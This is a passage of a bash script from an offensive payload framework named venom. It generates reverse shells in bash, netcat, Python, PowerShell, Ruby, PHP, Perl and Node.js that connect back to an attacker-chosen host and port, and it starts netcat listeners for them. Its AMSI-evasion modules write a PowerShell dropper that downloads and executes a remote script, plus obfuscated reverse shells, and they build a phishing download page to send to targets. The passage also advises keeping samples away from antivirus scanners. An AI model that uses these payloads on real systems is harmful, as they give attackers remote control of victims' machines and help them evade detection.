   # built-in systems shells
   if [ "$InSh3ll" = "1" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple bash shell..."
     echo "---"
     echo "- simple bash shell that uses bash dev/tcp"
     echo "- socket programming to build a conection over tcp"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     echo "- EXECUTE : sudo bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     echo "- NETCAT  : sudo nc -l -v -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "2" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple reverse bash shell..."
     echo "---"
     echo "- simple reverse bash shell uses bash dev/tcp"
     echo "- socket programming to build a reverse shell over tcp"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : 0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
     echo "- EXECUTE : sudo 0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2
 


   elif [ "$InSh3ll" = "3" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple reverse netcat shell..."
     echo "---"
     echo "- simple Netcat reverse shell using bash"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : /bin/sh | nc $lhost $lport"
     echo "- EXECUTE : sudo /bin/sh | nc $lhost $lport"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "4" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple ssh shell..."
     echo "---"
     echo "- Reverse connect using an SSH tunnel"
     echo "- Use The ssh client to forward a local port"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : ssh -R 6000:127.0.0.1:$lport $lhost"
     echo "- EXECUTE : sudo ssh -R 6000:127.0.0.1:$lport $lhost"
     echo "- NETCAT  : sudo nc -l -v 127.0.0.1 -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v 127.0.0.1 -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "5" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_shell.py > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.py > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.py > /dev/null 2>&1

     echo "[✔] Building -> simple reverse python shell..."
     echo "---"
     echo "- Reverse connect using one-liner python shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK"
     echo "-           _STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0); os.dup2"
     echo "-           (s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
     echo "- EXECUTE : python $N4m.py"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "6" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_shell2.py > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.py > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.py > /dev/null 2>&1
     chown $user $IPATH/output/$N4m.py > /dev/null 2>&1

     echo "[✔] Building -> simple reverse python shell..."
     echo "---"
     echo "- Reverse connect using one-liner python shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- http://securityweekly.com/2011/10/23/python-one-line-shell-code/"
     echo "-"
     echo "- SHELL   : import socket, subprocess;s = socket.socket();s.connect"
     echo "-           (('$lhost',$lport)) while 1: proc = subprocess.Popen(s.recv(1024),"
     echo "-           shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,"
     echo "-           stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"
     echo "- EXECUTE : python $N4m.py"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "7" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_powershell.ps1 > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.ps1 > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.ps1 > /dev/null 2>&1

     echo "[✔] Building -> simple powershell shell..."
     echo "---"
     echo "- Reverse connection using one-liner powershell (ancii enc)"
     echo "- that uses powershell socket to forward a tcp connection"
     echo "- http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html"
     echo "-"
     echo "- SHELL   : sm=(New-Object Net.Sockets.TCPClient("$lhost",$lport)).GetStream();"
     echo "-           [byte[]]bt=0..65535|%{0};while((i=sm.Read(bt,0,bt.Length)) -ne 0){;"
     echo "-           d=(New-Object Text.ASCIIEncoding).GetString(bt,0,i);st=([text.encoding]"
     echo "-           ::ASCII).GetBytes((iex d 2>&1));sm.Write(st,0,st.Length)}"
     echo "- EXECUTE : press twice in $N4m to execute!"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.ps1" --info --width 300 > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "8" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> reverse bin/sh shell..."
     echo "---"
     echo "- simple ruby bash shell that uses rsocket"
     echo "- socket programming to build a conection over tcp"
     echo "- http://pwnwiki.io/#!scripting/ruby.md"
     echo "-"
     echo "- SHELL   : ruby -rsocket -e'f=TCPSocket.open('$lhost',$lport).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "9" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> reverse bin/sh shell..."
     echo "---"
     echo "- simple ruby bash shell that uses rsocket"
     echo "- socket programming to build a conection over tcp"
     echo "- http://pwnwiki.io/#!scripting/ruby.md"
     echo "-"
     echo "- SHELL   : ruby -rsocket -e 'c=TCPSocket.new(\"$lhost\",\"$lport\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "10" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple php reverse shell..."
     echo "---"
     echo "- simple php reverse shell that uses socket programming"
     echo "- and bash (to execute) to forward a tcp connection"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : php -r 'sock=fsockopen('$lhost',$lport);exec('/bin/sh -i <&3 >&3 2>&3');'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "11" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" perl-reverse-shell.pl > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.pl > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.pl > /dev/null 2>&1

     echo "[✔] Building -> perl reverse shell..."
     echo "---"
     echo "- Reverse connect using one-liner perl shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- http://pentestmonkey.net/tools/web-shells/perl-reverse-shell"
     echo "-"
     echo "- SHELL : perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,"
     echo "-         getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open"
     echo "-         (STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo "- NETCAT: sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     gedit $IPATH/output/$N4m.pl & xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.pl" --info --width 300 > /dev/null 2>&1
     sleep 2


   elif [ "$InSh3ll" = "12" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     echo "require('chield_process').exec('bash -i >& /dev/tcp/$lhost/$lport 0>1');" > $IPATH/output/$N4m.js
     chmod +x $IPATH/output/$N4m.js > /dev/null 2>&1

     echo "[✔] Building -> node.js reverse shell..."
     echo "---"
     echo "- Reverse connect using one-liner javascript shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "-"
     echo "- SHELL : require('chield_process').exec('bash -i >& /dev/tcp/$lhost/$lport 0>1');"
     echo "- NETCAT: sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.js" --info --width 300 > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "M" ] || [ "$InSh3ll" = "m" ]; then
     echo "${YellowF}[!]${white} return to previous menu .."${Reset};
     sleep 2 && sh_menu


   else


     echo "${RedF}[x]${white} Abort module execution .."${Reset};
     sleep 2
     clear
   fi

else
  echo "${RedF}[x]${white} Abort module execution .."${Reset};
  sleep 2
  clear
fi
}





# ------------------------------------
# exit venom framework
# ------------------------------------
sh_exit () {


# arno0x0x av obfuscation
if [ "$Chts" = "ON" ]; then
  if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
    # backup msf modules
    echo "[✔] arno0x0x meterpreter loader random bytes stager: revert .."
    echo "[☠] Revert default msf modules .."
    sleep 1
    cp $IPATH/obfuscate/meterpreter_loader.rb $ArNo/meterpreter_loader.rb
    cp $IPATH/obfuscate/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader_64.rb
    # reload msfdb
    echo "[☠] Rebuild/Reload msf database .."
    sleep 1
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  else
    echo "[*] no backup msf modules found.."
    sleep 2
  fi
fi


echo "${BlueF}[☠]${white} Exit Console -> Stoping Services..."${Reset};
sleep 1
if [ "$DiStR0" = "Kali" ]; then
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
service apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi

# icmp (ping) shell
if [ "$ICMPDIS" = "disabled" ]; then
  sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
fi
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $ApAcHe/icmpsh.exe > /dev/null 2>&1
rm $IPATH/templates/hta_attack/index[bak].html > /dev/null 2>&1
cd $IPATH
cd ..
sudo chown -hR $user venom-main > /dev/null 2>&1
echo "${BlueF}[☠]${white} Report-Bugs: https://github.com/r00t-3xp10it/venom/issues"${Reset};
exit
}





## -------------------
# AMSI EVASION MODULES
## -------------------
sh_ninja () {
echo ${BlueF}[${YellowF}i${BlueF}]${white} Loading Amsi ${YellowF}[Evasion]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1
    ╔──────────────────────────────────────────────────────────────
    | DESCRIPTION        : Reverse TCP Powershell Shell
    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    | LOLBin             : WinHttpRequest
    | AGENT EXTENSION    : PS1
    |_DROPPER EXTENSION  : PS1

    AGENT Nº2
    ╔──────────────────────────────────────────────────────────────
    | DESCRIPTION        : Reverse OpenSSL Powershell Shell
    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    | LOLBin             : WinHttpRequest
    | AGENT EXTENSION    : PS1
    |_DROPPER EXTENSION  : PS1

    ╔─────────────────────────────────────────────────────────────╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚─────────────────────────────────────────────────────────────╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset};
read choice
case $choice in
1) sh_evasion1 ;;
2) sh_evasion2 ;;
3) sh_evasion3 ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
esac
}




# ----------------------------------------------
# Reverse TCP Powershell Shell + WinHttpRequest 
# ----------------------------------------------
sh_evasion1 () {
Colors;

## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 2

lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --entry --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$Drop" ]; then Drop="dropper";fi
if [ -z "$NaM" ]; then NaM="revshell";fi

# display final settings to user
echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : WinHttpRequest
    DROPPER  : $IPATH/output/$Drop.ps1
    AGENT    : $IPATH/output/$NaM.ps1
!
echo "---"


## BUILD DROPPER
echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1


## Build Reverse Powershell Shell
echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
sleep 2
echo "<#" > $IPATH/output/$NaM.ps1
echo "Obfuscated Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
echo "Original shell: @ZHacker13" >> $IPATH/output/$NaM.ps1
echo "#>" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "write-Host \"Please Wait, Executing PS Application ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
echo "\$MethodInvocation = \"gnidocnEiicsA.txeT.metsyS\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
echo "\$NewObjectCommand = (\$Constructor -Join '');\$icmpv6 = \"StreamWriter\";\$assembly = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
echo "\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
echo "\$socket = new-object \$PSArgException('$lhost', $lport);if(\$socket -eq \$null){exit 1};\$stream = \$socket.GetStream();" >> $IPATH/output/$NaM.ps1
echo "\$writer = new-object System.IO.\$icmpv6(\$stream);\$buffer = new-object System.Byte[] 1024;" >> $IPATH/output/$NaM.ps1
echo "\$comm = new-object \$NewObjectCommand;" >> $IPATH/output/$NaM.ps1
echo "do{" >> $IPATH/output/$NaM.ps1
echo "	\$writer.Write(\"prompt> \");" >> $IPATH/output/$NaM.ps1
echo "	\$writer.Flush();" >> $IPATH/output/$NaM.ps1
echo "	\$read = \$null;" >> $IPATH/output/$NaM.ps1
echo "	while(\$stream.DataAvailable -or (\$read = \$stream.Read(\$buffer, 0, 1024)) -eq \$null){};" >> $IPATH/output/$NaM.ps1
echo "	\$out = \$comm.GetString(\$buffer, 0, \$read).Replace(\"\`r\`n\",\"\").Replace(\"\`n\",\"\");" >> $IPATH/output/$NaM.ps1
echo "	if(!\$out.equals(\"exit\")){" >> $IPATH/output/$NaM.ps1
echo "		\$out = \$out.split(' ')" >> $IPATH/output/$NaM.ps1
echo "	        \$res = [string](&\$out[0] \$out[1..\$out.length]);" >> $IPATH/output/$NaM.ps1
echo "		if(\$res -ne \$null){ \$writer.WriteLine(\$res)};" >> $IPATH/output/$NaM.ps1
echo "	}" >> $IPATH/output/$NaM.ps1
echo "}While (!\$out.equals(\"exit\"))" >> $IPATH/output/$NaM.ps1
echo "\$writer.close();\$socket.close();" >> $IPATH/output/$NaM.ps1



## Building Phishing webpage
cd $IPATH/templates/phishing
echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
cd $IPATH


## Copy files to apache2 webroot
cd $IPATH/output
zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
cd $IPATH



## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---"
echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
## START HANDLER
xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
sleep 2


## Clean old files
echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/mega1.html > /dev/nul 2>&1
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
sh_menu
}




# --------------------------------------------------
# Reverse OpenSSL Powershell shell
# original shell: @int0x33
# --------------------------------------------------
sh_evasion2 () {
Colors;


## Make sure openssl dependencie its installed
imp=$(which openssl)
if ! [ "$?" -eq "0" ]; then
   echo "${RedF}[x]${BlueF} [${YellowF}openssl${BlueF}]${white} package not found, Please install it .."${Reset};sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}execute${BlueF}]${YellowF} sudo apt-get install openssl"${Reset};sleep 2
   sh_exit
fi

## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 2

lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --entry --width 300) > /dev/null 2>&1
CN=$(zenity --title="☠ Enter CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$Drop" ]; then Drop="dropper";fi
if [ -z "$NaM" ]; then NaM="revshell";fi
if [ -z "$CN" ]; then CN="SSARedTeam.com";fi

# display final settings to user
echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : WinHttpRequest
    CN NAME  : $CN
    DROPPER  : $IPATH/output/$Drop.ps1
    AGENT    : $IPATH/output/$NaM.ps1
!
echo "---"


## BUILD DROPPER
echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1


## Build Reverse Powershell Shell
echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
sleep 2
echo "<#" > $IPATH/output/$NaM.ps1
echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/$NaM.ps1
echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
echo "Original shell: @int0x33" >> $IPATH/output/$NaM.ps1
echo "#>" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "write-Host \"Please Wait, Executing PS Application ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
echo "\$MethodInvocation = \"tneilCpcT.stekcoS.teN\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);\$NewObjectCommand = (\$Constructor -Join '');" >> $IPATH/output/$NaM.ps1
echo "\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/$NaM.ps1
echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
